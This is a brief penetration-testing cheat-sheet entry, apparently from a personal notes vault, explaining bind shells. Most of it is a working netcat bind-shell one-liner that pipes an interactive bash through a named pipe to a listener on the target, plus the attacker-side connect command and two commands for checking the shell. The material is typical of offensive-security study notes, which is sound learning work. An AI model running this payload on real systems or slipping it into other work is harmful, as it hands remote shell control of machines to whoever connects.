# Bind Shells

Target opens a listener — attacker connects to it.

> Harder to use in practice — inbound connections are usually blocked by firewalls/NAT. Reverse shells are preferred. See [[04-Shells-Payloads/Reverse-Shells|Reverse Shells]].

---

## Netcat Bind Shell

```bash
# Target (server) — bind bash to listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <target-IP> 7777 > /tmp/f

# Attacker (client) — connect
nc -nv <target-IP> 7777
```

---

## Identify Shell on Target

```bash
ps                # see shell process
env | grep SHELL  # check SHELL env var
```
